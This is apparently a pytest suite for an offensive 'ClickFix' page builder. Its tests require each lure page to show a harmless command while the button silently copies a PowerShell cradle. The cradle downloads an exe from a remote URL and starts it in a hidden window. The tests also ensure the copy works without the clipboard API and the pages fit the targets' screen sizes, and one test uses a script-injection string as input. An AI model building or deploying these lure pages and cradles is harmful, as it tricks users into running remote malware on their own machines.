"""ClickFix page contracts: the button must copy something the page does not show.

The technique is one deception, and it is entirely testable:

* the visible command and the copied command are different strings
* the copied string is the cradle, byte for byte, and it is the only string the handler
  uses
* the page renders at both target resolutions — no fixed pixel width, no fixed height
* a command that would close the script element is refused, because the HTML parser ends
  the element before the JS parser sees the string, and the page silently copies nothing

Nothing here tests "does it convince anyone". That is not a property of the file.
"""

from __future__ import annotations

import json
import re

import pytest

from core import clickfix

URL = "https://cdn.example-edge.net/update/s.exe"


def _body(page: bytes) -> str:
    return page.decode("utf-8")


def _copied(page: bytes) -> str:
    """The string the handler is given, recovered from the rendered script."""
    match = re.search(r"var cradle = (\"(?:[^\"\\]|\\.)*\");", _body(page))
    assert match, "the handler has no cradle literal"
    return json.loads(match.group(1))


def test_the_button_copies_something_the_page_does_not_show() -> None:
    for key in clickfix.THEMES:
        page = clickfix.build(key, URL)["index.html"]
        shown = clickfix.THEMES[key].visible
        copied = _copied(page)
        assert shown in _body(page), f"{key}: the visible command is not on the page"
        assert copied != shown, f"{key}: the button copies what the page shows"
        assert shown in copied, f"{key}: the cradle does not lead with the visible half"


def test_the_copied_string_is_the_cradle_the_builder_composes() -> None:
    page = clickfix.build("dns-error", URL)["index.html"]
    expected = clickfix.cradle(URL, visible=clickfix.THEMES["dns-error"].visible)
    assert _copied(page) == expected
    assert expected.startswith("cmd /c ipconfig /flushdns & powershell")


def test_a_cradle_fetches_over_the_wire_and_starts_what_it_fetched() -> None:
    command = clickfix.cradle(URL, visible="ipconfig /flushdns")
    assert URL in command
    assert "-UseBasicParsing" in command, "IE engine init blocks a first-run profile"
    assert "-WindowStyle Hidden" in command
    assert "Start-Process" in command


def test_every_theme_is_a_distinct_page() -> None:
    rendered = {key: clickfix.build(key, URL)["index.html"] for key in clickfix.THEMES}
    assert len(set(rendered.values())) == len(rendered)
    for key, page in rendered.items():
        assert clickfix.THEMES[key].heading in _body(page)
        assert clickfix.THEMES[key].title in _body(page)


def test_the_page_is_responsive_at_both_target_resolutions() -> None:
    page = _body(clickfix.build("human-check", URL)["index.html"])
    assert '<meta name="viewport" content="width=device-width, initial-scale=1" />' in page
    assert "max-width: 640px" in page, "a fixed width overflows at 1366"
    assert "max-height: 720px" in page, "a short window clips the instruction"
    assert "width: 100%" in page


def test_the_page_works_without_the_clipboard_api() -> None:
    # navigator.clipboard needs a secure context; a page opened from disk or served over
    # plain http has no such thing, and the handler has to still copy.
    page = _body(clickfix.build("update-required", URL)["index.html"])
    assert "document.execCommand('copy')" in page
    assert ".catch(fallback)" in page


@pytest.mark.parametrize("url", ["ftp://example.com/a.exe", "https://", "https://a b.com/x"])
def test_a_url_that_cannot_be_pasted_into_a_shell_is_refused(url: str) -> None:
    with pytest.raises(clickfix.ClickFixError):
        clickfix.cradle(url, visible="ipconfig /flushdns")


def test_an_unknown_theme_is_refused() -> None:
    with pytest.raises(clickfix.ClickFixError):
        clickfix.build("windows-activation", URL)


def test_a_ready_command_and_a_url_at_once_is_refused() -> None:
    # Two sources for the one string that matters is how a page ships the wrong one.
    with pytest.raises(clickfix.ClickFixError):
        clickfix.build("dns-error", URL, command="cmd /c calc")


def test_a_command_that_closes_the_script_element_is_refused() -> None:
    page_free = "</script><script>alert(1)//"
    with pytest.raises(clickfix.ClickFixError):
        clickfix.build("dns-error", command=page_free)


def test_a_ready_command_renders_verbatim() -> None:
    command = "cmd /c ipconfig /flushdns & powershell -NoProfile -Command \"exit 0\""
    page = clickfix.build("dns-error", command=command)["index.html"]
    assert _copied(page) == command


def test_the_page_carries_no_payload() -> None:
    # A page is content. The artifact arrives over the wire, from the cradle, at the
    # user's own hand — which is the whole difference from a wrapper.
    page = clickfix.build("dns-error", URL)["index.html"]
    assert b"MZ" not in page[:64]
    assert len(page) < 16 * 1024
